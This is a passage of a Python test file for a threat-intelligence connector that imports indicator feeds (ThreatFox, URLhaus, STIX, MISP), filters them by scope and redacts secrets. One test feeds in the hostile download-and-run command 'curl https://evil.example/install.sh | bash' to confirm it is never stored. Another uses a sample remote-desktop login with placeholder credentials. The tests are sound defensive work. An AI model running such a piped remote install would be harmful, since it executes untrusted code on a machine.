from __future__ import annotations

import gzip
import json
import sqlite3
import zipfile
from pathlib import Path

import pytest
import typer
from typer.testing import CliRunner

import forge.connectors.cti as cti_module
from forge.connectors.cli import register_connector_commands
from forge.connectors.cti import CtiObservationImportConfig, import_cti_observations
from forge.connectors.registry import connector_statuses
from forge.db.migrations import run_migrations
from forge.db.schema import apply_schema
from forge.db.validation import validate_canonical_schema
from forge.phase6.report_synthesizer import ContextBuilder, ReportSynthesizer
from forge.reporting.dashboard import generate_dashboard
from forge.utils.intel.http_pacing import (
    cti_rate_limit_backoff_seconds,
    cti_rate_limit_retries,
    cti_request_delay_seconds,
)
from forge.utils.intel.observations import (
    classify_public_artifact_text,
    normalize_observation,
    observation_to_target_feed_item,
    provider_catalog,
    provider_catalog_policy_summary,
)


def _build_cti_db(path: Path) -> sqlite3.Connection:
    path.parent.mkdir(parents=True, exist_ok=True)
    con = sqlite3.connect(path)
    con.row_factory = sqlite3.Row
    apply_schema(con)
    run_migrations(con)
    validate_canonical_schema(con)
    con.execute(
        """
        INSERT INTO engagements (id, name, scope_json, status, operator)
        VALUES (
            1001,
            'Acme CTI',
            '["acme.example","*.acme.example","198.51.100.0/24"]',
            'ACTIVE',
            'connector-test'
        )
        """
    )
    con.commit()
    return con


def test_cti_connectors_are_catalog_only_and_free_first() -> None:
    statuses = connector_statuses(env={}, which=lambda _name: None)
    by_id = {row["id"]: row for row in statuses}

    assert by_id["abusech_threatfox"]["domain"] == "threat_intelligence"
    assert by_id["abusech_threatfox"]["safety"] == "passive_api"
    assert by_id["abusech_threatfox"]["execution_status"] == "wired_operator_path"
    assert by_id["abusech_threatfox"]["runner_supported"] is True
    assert by_id["abusech_threatfox"]["execution_paths"] == ["forge connectors import-cti"]
    assert by_id["abusech_urlhaus"]["cost_profile"] == "free_no_key"
    assert by_id["stix_taxii_import"]["safety"] == "passive_offline"
    assert by_id["misp_event_import"]["safety"] == "passive_offline"
    assert by_id["misp_event_import"]["execution_paths"] == ["forge connectors import-cti"]
    assert by_id["supabase_table_import"]["safety"] == "passive_offline"
    assert by_id["supabase_table_import"]["execution_paths"] == ["forge connectors import-cti"]
    assert "scope_manifest_seed_promotion" in by_id["abusech_urlhaus"]["required_gates"]


def test_provider_catalog_defaults_show_broad_source_backlog() -> None:
    default_ids = {entry.id for entry in provider_catalog()}
    all_ids = {entry.id for entry in provider_catalog(include_sensitive=True)}

    assert {
        "abusech_threatfox",
        "abusech_urlhaus",
        "alienvault_otx",
        "osint_people_identity",
        "osint_social_realtime_search",
        "stix_taxii_import",
        "misp_event_import",
        "supabase_table_import",
        "ukr_pw_sysadmin_snippet_catalog",
        "ukr_pw_network_firewall_config_patterns",
    } <= default_ids
    assert default_ids == all_ids


def test_provider_catalog_policy_summary_maps_default_and_opt_in_sources() -> None:
    summary = provider_catalog_policy_summary()

    assert summary["schema_version"] == "forge.connector_policy_summary.v1"
    assert summary["total_count"] == len(provider_catalog(include_sensitive=True))
    assert summary["default_enabled_count"] == len(provider_catalog())
    assert summary["opt_in_provider_ids"] == []
    assert {
        "github_code_search_public",
        "social_search_curated",
        "osint_breach_social",
        "osint_people_identity",
        "osint_telegram_public_channels",
        "ukr_pw_sysadmin_snippet_catalog",
        "ukr_pw_webserver_config_patterns",
    } <= set(summary["default_provider_ids"])
    assert {
        "misp_event_import",
        "stix_taxii_import",
        "supabase_table_import",
    } <= set(summary["offline_import_provider_ids"])
    assert {
        "abusech_threatfox",
        "abusech_urlhaus",
        "crtsh_certificate_transparency",
        "github_code_search_public",
        "social_search_curated",
    } <= set(summary["live_or_api_provider_ids"])
    assert {
        "github_code_search_public",
        "osint_breach_social",
        "osint_people_identity",
        "osint_social_realtime_search",
        "social_search_curated",
    } <= set(summary["manual_opt_in_provider_ids"])
    assert summary["required_gate_counts"]["operator_opt_in"] >= 20
    assert summary["required_gate_counts"]["people_search_policy"] >= 10
    assert summary["required_gate_counts"]["provider_rate_limit"] >= 4
    assert summary["safety_tier_counts"]["blocked_sensitive"] == 2
    assert summary["safety_tier_counts"]["catalog_unsafe_text"] == 5
    assert summary["collection_method_counts"]["catalog_only"] >= 6


def test_connector_policy_summary_cli_outputs_catalog_policy_json() -> None:
    app = typer.Typer()
    connectors_app = typer.Typer()
    register_connector_commands(connectors_app)
    app.add_typer(connectors_app, name="connectors")

    result = CliRunner().invoke(app, ["connectors", "policy-summary", "--json"])

    assert result.exit_code == 0, result.output
    payload = json.loads(result.output)
    assert payload["schema_version"] == "forge.connector_policy_summary.v1"
    assert payload["total_count"] == len(provider_catalog(include_sensitive=True))
    assert {
        "misp_event_import",
        "stix_taxii_import",
        "supabase_table_import",
    } <= set(payload["offline_import_provider_ids"])
    assert {
        "abusech_threatfox",
        "abusech_urlhaus",
    } <= set(payload["live_or_api_provider_ids"])
    assert "raw" not in json.dumps(payload, sort_keys=True).lower()


def test_connector_policy_summary_cli_human_output_is_non_executing() -> None:
    app = typer.Typer()
    connectors_app = typer.Typer()
    register_connector_commands(connectors_app)
    app.add_typer(connectors_app, name="connectors")

    result = CliRunner().invoke(app, ["connectors", "policy-summary"])

    assert result.exit_code == 0, result.output
    normalized_output = " ".join(result.output.split())
    assert "offline_import" in result.output
    assert "live_or_api" in result.output
    assert "no provider is contacted" in normalized_output
    assert "third-party command" in normalized_output


def test_observation_normalizes_to_target_feed_without_raw_provider_body() -> None:
    observation = normalize_observation(
        {
            "type": "url",
            "value": "HTTPS://Example.COM/login?token=secret&ok=1",
            "confidence": 1.7,
            "tlp": "green",
            "raw": "provider body with token=secret",
            "provenance": "ThreatFox IOC #123 password=secret",
        },
        provider="abusech_threatfox",
        source_url="https://user:pass@threatfox.abuse.ch/ioc/123?token=secret&ok=1",
    )

    assert observation is not None
    assert observation.indicator_value == "https://example.com/login?ok=1"
    assert observation.source_url == "https://threatfox.abuse.ch/ioc/123?ok=1"
    assert observation.provenance == "ThreatFox IOC #123 password=[REDACTED]"
    assert observation.confidence == 1.0
    assert observation.tlp == "TLP:GREEN"
    assert len(observation.raw_artifact_hash) == 64
    assert "secret" not in json.dumps(observation.to_dict()).lower()

    feed_item = observation_to_target_feed_item(observation)
    assert feed_item == {
        "target_type": "url",
        "target_value": "https://example.com/login?ok=1",
        "source_kind": "cti_osint:abusech_threatfox",
        "confidence": 1.0,
        "first_seen_at": observation.observed_at,
        "provenance": "ThreatFox IOC #123 password=[REDACTED]",
    }


def test_sensitive_observations_are_rejected_unless_explicitly_allowed() -> None:
    raw = {"type": "phone", "value": "+1 555 123 4567", "confidence": 0.9}

    assert normalize_observation(raw, provider="social_search_curated") is None
    allowed = normalize_observation(raw, provider="social_search_curated", allow_sensitive=True)

    assert allowed is not None
    assert observation_to_target_feed_item(allowed) is None


def test_public_artifact_classifier_redacts_commands_and_tags_risks() -> None:
    result = classify_public_artifact_text(
        """
        mstsc /v:192.168.1.10 /u:admin /p:SuperSecret!
        OPENVPN password: hunter2
        proxy auth strong password=another-secret
        server_name vpn.example.com;
        token=abc123
        """,
        source_url="https://ukr.pw/hyd.txt",
    )
    blob = json.dumps(result, sort_keys=True).lower()

    assert {
        "credential_recovery",
        "remote_access",
        "proxy_config",
        "web_server_config",
        "possible_secret",
        "internal_network_reference",
    } <= set(result["risk_tags"])
    assert "vpn.example.com" in result["observables"]["domains"]
    assert "supersecret" not in blob
    assert "hunter2" not in blob
    assert "another-secret" not in blob
    assert "abc123" not in blob
    assert result["safety"] == "unsafe_text_only_no_execution"


def test_cti_pacing_env_values_are_bounded(monkeypatch) -> None:
    monkeypatch.setenv("FORGE_CTI_REQUEST_DELAY_SECONDS", "999")
    monkeypatch.setenv("FORGE_CTI_RATE_LIMIT_BACKOFF_SECONDS", "0")
    monkeypatch.setenv("FORGE_CTI_RATE_LIMIT_RETRIES", "9")

    assert cti_request_delay_seconds() == 60.0
    assert cti_rate_limit_backoff_seconds() == 1.0
    assert cti_rate_limit_retries() == 3


def test_cti_observation_import_persists_normalized_rows_and_promotes_scoped_seeds(
    tmp_path: Path,
) -> None:
    con = _build_cti_db(tmp_path / "engagement.db")
    secret_value = "secret-token-should-not-persist"
    report = {
        "observations": [
            {
                "type": "domain",
                "value": "Portal.Acme.Example",
                "confidence": 0.9,
                "tlp": "clear",
                "provenance": "ThreatFox IOC 1",
                "raw_body": f"token={secret_value}",
            },
            {
                "type": "url",
                "value": "https://outside.example/login?token=drop",
                "confidence": 0.8,
                "provenance": "URLHaus IOC 2",
            },
            {"type": "phone", "value": "+1 555 123 4567", "confidence": 0.7},
            {
                "type": "domain",
                "value": "Portal.Acme.Example",
                "confidence": 0.9,
                "tlp": "clear",
                "provenance": "ThreatFox IOC 1",
                "raw_body": f"token={secret_value}",
            },
        ]
    }

    try:
        result = import_cti_observations(
            con,
            CtiObservationImportConfig(
                connector_id="abusech_threatfox",
                engagement_id=1001,
                provider="threatfox",
                source_url="https://threatfox.abuse.ch/export/json/recent/",
                promote_targets=True,
                operator="cti-test",
            ),
            report_text=json.dumps(report),
        )
        observations = con.execute(
            """
            SELECT provider, indicator_type, indicator_value, source_url,
                   raw_artifact_hash, metadata_json
            FROM cti_observations
            ORDER BY indicator_type, indicator_value
            """
        ).fetchall()
        seeds = {
            (row["seed_value"], row["seed_type"])
            for row in con.execute(
                """
                SELECT seed_value, seed_type
                FROM engagement_seeds
                WHERE engagement_id=1001
                """
            ).fetchall()
        }
        audit = con.execute(
            """
            SELECT module, action, target, result, operator
            FROM audit_log
            WHERE engagement_id=1001 AND action='cti_observation_import'
            """
        ).fetchone()
    finally:
        con.close()

    blob = json.dumps(
        {
            "result": result,
            "observations": [dict(row) for row in observations],
            "audit": dict(audit),
        },
        sort_keys=True,
    )
    assert result["status"] == "completed"
    assert result["result_schema_version"] == "forge.cti_observation_import.v1"
    assert result["parsed_count"] == 3
    assert result["persisted_count"] == 2
    assert result["duplicate_count"] == 1
    assert result["promoted_seed_count"] == 1
    assert result["skipped_count"] == 2
    assert result["parsed_indicator_type_counts"] == {"domain": 2, "url": 1}
    assert result["parsed_tlp_counts"] == {"TLP:CLEAR": 3}
    assert result["rejected_sensitive_type_counts"] == {"phone": 1}
    assert result["unsafe_text_item_count"] == 0
    assert result["target_feed_type_counts"] == {"domain": 2, "url": 1}
    assert result["skipped_reason_counts"] == {
        "observation_rejected": 1,
        "out_of_scope": 1,
    }
    assert {row["reason"] for row in result["skipped"]} == {
        "observation_rejected",
        "out_of_scope",
    }
    assert len(observations) == 2
    assert observations[0]["indicator_value"] == "portal.acme.example"
    assert observations[1]["indicator_value"] == "https://outside.example/login"
    assert ("portal.acme.example", "domain") in seeds
    assert audit["module"] == "abusech_threatfox"
    assert audit["action"] == "cti_observation_import"
    assert "persisted=2" in audit["result"]
    assert "promoted=1" in audit["result"]
    assert secret_value not in blob


def test_cti_import_accepts_threatfox_provider_export_shape(tmp_path: Path) -> None:
    con = _build_cti_db(tmp_path / "engagement.db")
    report = {
        "query_status": "ok",
        "data": [
            {
                "id": "41",
                "ioc": "Portal.Acme.Example",
                "ioc_type": "domain",
                "threat_type": "payload_delivery",
                "malware": "example-loader",
                "confidence_level": 75,
                "first_seen": "2026-08-20 10:00:00 UTC",
                "reference": "https://threatfox.abuse.ch/ioc/41/",
                "tags": ["loader", "campaign-x"],
            },
            {
                "id": "42",
                "ioc": "198.51.100.10:443",
                "ioc_type": "ip:port",
                "confidence_level": "50",
                "first_seen": "2026-08-20 10:05:00 UTC",
            },
        ],
    }

    try:
        result = import_cti_observations(
            con,
            CtiObservationImportConfig(
                connector_id="abusech_threatfox",
                engagement_id=1001,
                source_url="https://threatfox.abuse.ch/api/",
                promote_targets=True,
            ),
            report_text=json.dumps(report),
        )
        rows = con.execute(
            """
            SELECT indicator_type, indicator_value, confidence, provenance, source_url, tags_json
            FROM cti_observations
            ORDER BY indicator_type, indicator_value
            """
        ).fetchall()
    finally:
        con.close()

    assert result["parsed_count"] == 2
    assert result["persisted_count"] == 2
    assert result["promoted_seed_count"] == 2
    assert [(row["indicator_type"], row["indicator_value"]) for row in rows] == [
        ("domain", "portal.acme.example"),
        ("ipv4", "198.51.100.10"),
    ]
    assert rows[0]["confidence"] == 0.75
    assert "ThreatFox IOC 41" in rows[0]["provenance"]
    assert rows[0]["source_url"] == "https://threatfox.abuse.ch/ioc/41/"
    assert json.loads(rows[0]["tags_json"]) == ["campaign-x", "loader"]


def test_cti_import_counts_unsafe_command_text_without_persisting_it(tmp_path: Path) -> None:
    con = _build_cti_db(tmp_path / "engagement.db")
    unsafe_command = "curl https://evil.example/install.sh | bash"
    report = {
        "items": [
            {
                "type": "domain",
                "value": "Portal.Acme.Example",
                "command": unsafe_command,
                "provenance": f"operator note {unsafe_command}",
            }
        ]
    }

    try:
        result = import_cti_observations(
            con,
            CtiObservationImportConfig(
                connector_id="stix_taxii_import",
                engagement_id=1001,
            ),
            report_text=json.dumps(report),
        )
        row = con.execute(
            """
            SELECT indicator_type, indicator_value, metadata_json, provenance
            FROM cti_observations
            """
        ).fetchone()
    finally:
        con.close()

    blob = json.dumps({"result": result, "row": dict(row)}, sort_keys=True)
    assert result["parsed_count"] == 1
    assert result["persisted_count"] == 1
    assert result["unsafe_text_item_count"] == 1
    assert row["indicator_type"] == "domain"
    assert row["indicator_value"] == "portal.acme.example"
    assert "curl" not in blob.lower()
    assert "install.sh" not in blob.lower()
    assert "evil.example" not in blob.lower()


def test_cti_import_accepts_urlhaus_provider_export_shape(tmp_path: Path) -> None:
    con = _build_cti_db(tmp_path / "engagement.db")
    secret_value = "urlhaus-auth-token"
    report = {
        "items": [
            {
                "id": "9001",
                "url": f"https://portal.acme.example/download?token={secret_value}&ok=1",
                "url_status": "online",
                "threat": "malware_download",
                "dateadded": "2026-08-20 10:00:00 UTC",
                "urlhaus_reference": (
                    f"https://urlhaus.abuse.ch/url/9001/?api_key={secret_value}&ok=1"
                ),
                "tags": ["exe", "loader"],
            }
        ]
    }

    try:
        result = import_cti_observations(
            con,
            CtiObservationImportConfig(
                connector_id="abusech_urlhaus",
                engagement_id=1001,
                source_url="https://urlhaus-api.abuse.ch/v2/files/exports/recent.json",
            ),
            report_text=json.dumps(report),
        )
        row = con.execute(
            """
            SELECT indicator_type, indicator_value, confidence, provenance, source_url, tags_json
            FROM cti_observations
            """
        ).fetchone()
    finally:
        con.close()

    blob = json.dumps({"result": result, "row": dict(row)}, sort_keys=True)
    assert result["parsed_count"] == 1
    assert result["persisted_count"] == 1
    assert row["indicator_type"] == "url"
    assert row["indicator_value"] == "https://portal.acme.example/download?ok=1"
    assert row["confidence"] == 0.9
    assert "URLHaus URL 9001" in row["provenance"]
    assert row["source_url"] == "https://urlhaus.abuse.ch/url/9001/?ok=1"
    assert json.loads(row["tags_json"]) == ["exe", "loader"]
    assert secret_value not in blob


def test_cti_import_accepts_threatfox_csv_export_shape(tmp_path: Path) -> None:
    con = _build_cti_db(tmp_path / "engagement.db")
    report = "\n".join(
        [
            "id,ioc,ioc_type,threat_type,malware,confidence_level,first_seen,reference,tags",
            (
                "41,Portal.Acme.Example,domain,payload_delivery,example-loader,75,"
                "2026-08-20 10:00:00 UTC,https://threatfox.abuse.ch/ioc/41/,loader campaign-x"
            ),
            "42,198.51.100.10:443,ip:port,c2,,50,2026-08-20 10:05:00 UTC,,",
        ]
    )

    try:
        result = import_cti_observations(
            con,
            CtiObservationImportConfig(
                connector_id="abusech_threatfox",
                engagement_id=1001,
                source_url="threatfox-offline-csv",
                promote_targets=True,
            ),
            report_text=report,
        )
        rows = con.execute(
            """
            SELECT indicator_type, indicator_value, confidence, provenance, tags_json
            FROM cti_observations
            ORDER BY indicator_type, indicator_value
            """
        ).fetchall()
    finally:
        con.close()

    assert result["source_format"] == "csv"
    assert result["parsed_count"] == 2
    assert result["persisted_count"] == 2
    assert result["promoted_seed_count"] == 2
    assert result["parsed_indicator_type_counts"] == {"domain": 1, "ipv4": 1}
    assert result["target_feed_type_counts"] == {"domain": 1, "ip": 1}
    assert [(row["indicator_type"], row["indicator_value"]) for row in rows] == [
        ("domain", "portal.acme.example"),
        ("ipv4", "198.51.100.10"),
    ]
    assert rows[0]["confidence"] == 0.75
    assert "ThreatFox IOC 41" in rows[0]["provenance"]
    assert json.loads(rows[0]["tags_json"]) == ["campaign-x", "loader"]


def test_cti_import_accepts_urlhaus_csv_export_shape(tmp_path: Path) -> None:
    con = _build_cti_db(tmp_path / "engagement.db")
    secret_value = "urlhaus-csv-token"
    report = "\n".join(
        [
            "id,url,url_status,threat,dateadded,urlhaus_reference,tags",
            (
                "9001,"
                f"https://portal.acme.example/download?token={secret_value}&ok=1,"
                "online,malware_download,2026-08-20 10:00:00 UTC,"
                f"https://urlhaus.abuse.ch/url/9001/?api_key={secret_value}&ok=1,"
                "exe loader"
            ),
        ]
    )

    try:
        result = import_cti_observations(
            con,
            CtiObservationImportConfig(
                connector_id="abusech_urlhaus",
                engagement_id=1001,
                source_url="urlhaus-offline-csv",
            ),
            report_text=report,
        )
        row = con.execute(
            """
            SELECT indicator_type, indicator_value, confidence, provenance, source_url, tags_json
            FROM cti_observations
            """
        ).fetchone()
    finally:
        con.close()

    blob = json.dumps({"result": result, "row": dict(row)}, sort_keys=True)
    assert result["source_format"] == "csv"
    assert result["parsed_count"] == 1
    assert result["persisted_count"] == 1
    assert row["indicator_type"] == "url"
    assert row["indicator_value"] == "https://portal.acme.example/download?ok=1"
    assert row["confidence"] == 0.9
    assert "URLHaus URL 9001" in row["provenance"]
    assert row["source_url"] == "https://urlhaus.abuse.ch/url/9001/?ok=1"
    assert json.loads(row["tags_json"]) == ["exe", "loader"]
    assert secret_value not in blob


def test_cti_import_malformed_json_does_not_fall_back_to_csv(tmp_path: Path) -> None:
    con = _build_cti_db(tmp_path / "engagement.db")
    try:
        with pytest.raises(ValueError, match="not valid JSON"):
            import_cti_observations(
                con,
                CtiObservationImportConfig(
                    connector_id="stix_taxii_import",
                    engagement_id=1001,
                ),
                report_text='{"items": [',
            )
        cti_table = con.execute(
            "SELECT 1 FROM sqlite_master WHERE type='table' AND name='cti_observations'"
        ).fetchone()
    finally:
        con.close()

    assert cti_table is None


def test_cti_import_accepts_stix_indicator_bundle_shape(tmp_path: Path) -> None:
    con = _build_cti_db(tmp_path / "engagement.db")
    report = {
        "type": "bundle",
        "objects": [
            {
                "type": "indicator",
                "id": "indicator--11111111-1111-4111-8111-111111111111",
                "name": "Acme phishing domain",
                "pattern": "[domain-name:value = 'Portal.Acme.Example']",
                "confidence": 80,
                "valid_from": "2026-08-20T10:00:00Z",
                "labels": ["phishing", "osint"],
                "external_references": [
                    {"source_name": "fixture", "url": "https://cti.example/stix/1"}
                ],
            },
            {
                "type": "malware",
                "id": "malware--22222222-2222-4222-8222-222222222222",
                "name": "ignored object",
            },
        ],
    }

    try:
        result = import_cti_observations(
            con,
            CtiObservationImportConfig(
                connector_id="stix_taxii_import",
                engagement_id=1001,
                source_url="local-stix-bundle",
            ),
            report_text=json.dumps(report),
        )
        row = con.execute(
            """
            SELECT indicator_type, indicator_value, confidence, provenance, source_url, tags_json
            FROM cti_observations
            """
        ).fetchone()
    finally:
        con.close()

    assert result["parsed_count"] == 1
    assert result["persisted_count"] == 1
    assert result["skipped_count"] == 1
    assert result["skipped"][0]["reason"] == "observation_rejected"
    assert row["indicator_type"] == "domain"
    assert row["indicator_value"] == "portal.acme.example"
    assert row["confidence"] == 0.8
    assert row["provenance"] == "Acme phishing domain"
    assert row["source_url"] == "https://cti.example/stix/1"
    assert json.loads(row["tags_json"]) == ["osint", "phishing"]


def test_cti_import_accepts_misp_event_attribute_shape(tmp_path: Path) -> None:
    con = _build_cti_db(tmp_path / "engagement.db")
    report = {
        "Event": {
            "uuid": "event-1111",
            "info": "Acme phishing campaign",
            "date": "2026-08-20",
            "Tag": [{"name": "tlp:amber"}, {"name": "campaign-x"}],
            "Attribute": [
                {
                    "uuid": "attribute-1111",
                    "type": "domain",
                    "value": "Portal.Acme.Example",
                    "to_ids": True,
                    "comment": "landing domain",
                    "Tag": [{"name": "phishing"}],
                },
                {
                    "uuid": "attribute-2222",
                    "type": "ip-dst|port",
                    "value": "198.51.100.10|443",
                    "to_ids": False,
                },
            ],
        }
    }

    try:
        result = import_cti_observations(
            con,
            CtiObservationImportConfig(
                connector_id="misp_event_import",
                engagement_id=1001,
                promote_targets=True,
            ),
            report_text=json.dumps(report),
        )
        rows = con.execute(
            """
            SELECT indicator_type, indicator_value, confidence, provenance, tlp, tags_json
            FROM cti_observations
            ORDER BY indicator_type, indicator_value
            """
        ).fetchall()
    finally:
        con.close()

    assert result["connector_id"] == "misp_event_import"
    assert result["parsed_count"] == 2
    assert result["persisted_count"] == 2
    assert result["promoted_seed_count"] == 2
    assert [(row["indicator_type"], row["indicator_value"]) for row in rows] == [
        ("domain", "portal.acme.example"),
        ("ip", "198.51.100.10"),
    ]
    assert rows[0]["confidence"] == 0.75
    assert rows[1]["confidence"] == 0.4
    assert rows[0]["tlp"] == "TLP:AMBER"
    assert "MISP attribute attribute-1111" in rows[0]["provenance"]
    assert "Acme phishing campaign" in rows[0]["provenance"]
    assert json.loads(rows[0]["tags_json"]) == ["campaign-x", "phishing", "tlp:amber"]


def test_cti_import_misp_unix_timestamps_work_with_observed_window(
    tmp_path: Path,
) -> None:
    con = _build_cti_db(tmp_path / "engagement.db")
    report = {
        "Event": {
            "uuid": "event-2222",
            "info": "MISP timestamp window",
            "Attribute": [
                {
                    "uuid": "attribute-old",
                    "type": "domain",
                    "value": "old.acme.example",
                    "timestamp": "1797724740",
                },
                {
                    "uuid": "attribute-kept",
                    "type": "domain",
                    "value": "kept.acme.example",
                    "timestamp": "1797724800",
                },
            ],
        }
    }

    try:
        result = import_cti_observations(
            con,
            CtiObservationImportConfig(
                connector_id="misp_event_import",
                engagement_id=1001,
                since="2026-12-20T00:00:00Z",
                until="2026-12-20T00:01:00Z",
            ),
            report_text=json.dumps(report),
        )
        rows = con.execute(
            "SELECT indicator_value, observed_at FROM cti_observations"
        ).fetchall()
    finally:
        con.close()

    assert result["parsed_count"] == 2
    assert result["filtered_count"] == 1
    assert result["persisted_count"] == 1
    assert result["skipped"][0]["reason"] == "before_since"
    assert [(row["indicator_value"], row["observed_at"]) for row in rows] == [
        ("kept.acme.example", "2026-12-20T00:00:00Z")
    ]


def test_cti_import_accepts_misp_attribute_search_shape(tmp_path: Path) -> None:
    con = _build_cti_db(tmp_path / "engagement.db")
    secret_value = "misp-attribute-token"
    report = {
        "response": {
            "Attribute": [
                {
                    "uuid": "attribute-url",
                    "type": "url",
                    "value": f"https://portal.acme.example/path?token={secret_value}&ok=1",
                    "timestamp": "1797724800",
                    "to_ids": "1",
                    "Tag": [{"name": "tlp:green"}],
                }
            ]
        }
    }

    try:
        result = import_cti_observations(
            con,
            CtiObservationImportConfig(
                connector_id="misp_event_import",
                engagement_id=1001,
                promote_targets=True,
            ),
            report_text=json.dumps(report),
        )
        row = con.execute(
            """
            SELECT indicator_type, indicator_value, confidence, observed_at, tlp, tags_json
            FROM cti_observations
            """
        ).fetchone()
    finally:
        con.close()

    blob = json.dumps({"result": result, "row": dict(row)}, sort_keys=True)
    assert result["parsed_count"] == 1
    assert result["persisted_count"] == 1
    assert result["promoted_seed_count"] == 1
    assert row["indicator_type"] == "url"
    assert row["indicator_value"] == "https://portal.acme.example/path?ok=1"
    assert row["confidence"] == 0.75
    assert row["observed_at"] == "2026-12-20T00:00:00Z"
    assert row["tlp"] == "TLP:GREEN"
    assert json.loads(row["tags_json"]) == ["tlp:green"]
    assert secret_value not in blob


def test_cti_import_accepts_supabase_table_export_rows(tmp_path: Path) -> None:
    con = _build_cti_db(tmp_path / "engagement.db")
    secret_value = "supabase-table-token"
    report = {
        "rows": [
            {
                "id": "row-url",
                "table_name": "candidate_targets",
                "Supabase_URL": f"https://portal.acme.example/login?apikey={secret_value}&ok=1",
                "First_Seen_At": "2026-08-20T10:00:00Z",
                "Confidence": "0.81",
                "Provenance_Summary": f"telegram scrape token={secret_value}",
            },
            {
                "id": "row-domain",
                "table_name": "candidate_targets",
                "Network_Domain": "API.Acme.Example",
                "Created_At": "2026-08-20T11:00:00Z",
            },
        ]
    }

    try:
        result = import_cti_observations(
            con,
            CtiObservationImportConfig(
                connector_id="supabase_table_import",
                engagement_id=1001,
                promote_targets=True,
            ),
            report_text=json.dumps(report),
        )
        rows = con.execute(
            """
            SELECT indicator_type, indicator_value, confidence, observed_at, provenance
            FROM cti_observations
            ORDER BY indicator_type DESC
            """
        ).fetchall()
    finally:
        con.close()

    blob = json.dumps(
        {"result": result, "rows": [dict(row) for row in rows]},
        sort_keys=True,
    )
    assert result["connector_id"] == "supabase_table_import"
    assert result["parsed_count"] == 2
    assert result["persisted_count"] == 2
    assert result["promoted_seed_count"] == 2
    assert result["parsed_indicator_type_counts"] == {"domain": 1, "url": 1}
    assert result["target_feed_type_counts"] == {"domain": 1, "url": 1}
    assert rows[0]["indicator_type"] == "url"
    assert rows[0]["indicator_value"] == "https://portal.acme.example/login?ok=1"
    assert rows[0]["confidence"] == 0.81
    assert rows[0]["observed_at"] == "2026-08-20T10:00:00Z"
    assert rows[1]["indicator_type"] == "domain"
    assert rows[1]["indicator_value"] == "api.acme.example"
    assert secret_value not in blob


def test_cti_import_dry_run_does_not_write_observations_seeds_or_audit(
    tmp_path: Path,
) -> None:
    con = _build_cti_db(tmp_path / "engagement.db")
    secret_value = "dry-run-secret"
    report = {
        "items": [
            {
                "type": "domain",
                "value": "Portal.Acme.Example",
                "confidence": 0.8,
                "provenance": f"dry run token={secret_value}",
            },
            {
                "type": "url",
                "value": "https://outside.example/login",
                "confidence": 0.7,
            },
        ]
    }

    try:
        result = import_cti_observations(
            con,
            CtiObservationImportConfig(
                connector_id="stix_taxii_import",
                engagement_id=1001,
                source_url=f"local-fixture?token={secret_value}",
                promote_targets=True,
                dry_run=True,
            ),
            report_text=json.dumps(report),
        )
        cti_table = con.execute(
            "SELECT 1 FROM sqlite_master WHERE type='table' AND name='cti_observations'"
        ).fetchone()
        seed_count = con.execute(
            "SELECT COUNT(*) FROM engagement_seeds WHERE engagement_id=1001"
        ).fetchone()[0]
        audit_count = con.execute(
            """
            SELECT COUNT(*)
            FROM audit_log
            WHERE engagement_id=1001 AND action='cti_observation_import'
            """
        ).fetchone()[0]
    finally:
        con.close()

    blob = json.dumps(result, sort_keys=True)
    assert result["status"] == "dry_run"
    assert result["dry_run"] is True
    assert result["parsed_count"] == 2
    assert result["persisted_count"] == 0
    assert result["would_persist_count"] == 2
    assert result["promoted_seed_count"] == 0
    assert result["would_promote_seed_count"] == 1
    assert result["skipped_count"] == 1
    assert result["skipped"][0]["reason"] == "out_of_scope"
    assert cti_table is None
    assert seed_count == 0
    assert audit_count == 0
    assert secret_value not in blob


def test_cti_import_dry_run_reports_existing_and_in_file_duplicates(
    tmp_path: Path,
) -> None:
    con = _build_cti_db(tmp_path / "engagement.db")
    existing_report = {
        "items": [
            {
                "type": "domain",
                "value": "portal.acme.example",
                "confidence": 0.8,
                "provenance": "shared source",
            }
        ]
    }
    dry_run_report = {
        "items": [
            {
                "type": "domain",
                "value": "portal.acme.example",
                "confidence": 0.8,
                "provenance": "shared source",
            },
            {
                "type": "domain",
                "value": "new.acme.example",
                "confidence": 0.7,
                "provenance": "new source",
            },
            {
                "type": "domain",
                "value": "new.acme.example",
                "confidence": 0.7,
                "provenance": "new source",
            },
        ]
    }

    try:
        import_cti_observations(
            con,
            CtiObservationImportConfig(
                connector_id="stix_taxii_import",
                engagement_id=1001,
            ),
            report_text=json.dumps(existing_report),
        )
        before_count = con.execute("SELECT COUNT(*) FROM cti_observations").fetchone()[0]
        result = import_cti_observations(
            con,
            CtiObservationImportConfig(
                connector_id="stix_taxii_import",
                engagement_id=1001,
                promote_targets=True,
                dry_run=True,
            ),
            report_text=json.dumps(dry_run_report),
        )
        after_count = con.execute("SELECT COUNT(*) FROM cti_observations").fetchone()[0]
        seed_count = con.execute(
            "SELECT COUNT(*) FROM engagement_seeds WHERE engagement_id=1001"
        ).fetchone()[0]
    finally:
        con.close()

    assert result["status"] == "dry_run"
    assert result["parsed_count"] == 3
    assert result["persisted_count"] == 0
    assert result["would_persist_count"] == 1
    assert result["would_duplicate_count"] == 2
    assert result["would_promote_seed_count"] == 1
    assert before_count == 1
    assert after_count == 1
    assert seed_count == 0


def test_cti_import_fail_on_empty_rejects_files_without_accepted_observations(
    tmp_path: Path,
) -> None:
    con = _build_cti_db(tmp_path / "engagement.db")
    report = {
        "items": [
            {"type": "phone", "value": "+1 555 123 4567"},
            {"type": "private_message", "value": "not importable"},
        ]
    }

    try:
        with pytest.raises(ValueError, match="no accepted observations"):
            import_cti_observations(
                con,
                CtiObservationImportConfig(
                    connector_id="stix_taxii_import",
                    engagement_id=1001,
                    dry_run=True,
                    fail_on_empty=True,
                ),
                report_text=json.dumps(report),
            )
        cti_table = con.execute(
            "SELECT 1 FROM sqlite_master WHERE type='table' AND name='cti_observations'"
        ).fetchone()
        seed_count = con.execute(
            "SELECT COUNT(*) FROM engagement_seeds WHERE engagement_id=1001"
        ).fetchone()[0]
        audit_count = con.execute(
            """
            SELECT COUNT(*)
            FROM audit_log
            WHERE engagement_id=1001 AND action='cti_observation_import'
            """
        ).fetchone()[0]
    finally:
        con.close()

    assert cti_table is None
    assert seed_count == 0
    assert audit_count == 0


def test_cti_import_fail_on_empty_allows_duplicate_only_reimport(tmp_path: Path) -> None:
    con = _build_cti_db(tmp_path / "engagement.db")
    report = {"items": [{"type": "domain", "value": "portal.acme.example"}]}

    try:
        import_cti_observations(
            con,
            CtiObservationImportConfig(
                connector_id="stix_taxii_import",
                engagement_id=1001,
            ),
            report_text=json.dumps(report),
        )
        result = import_cti_observations(
            con,
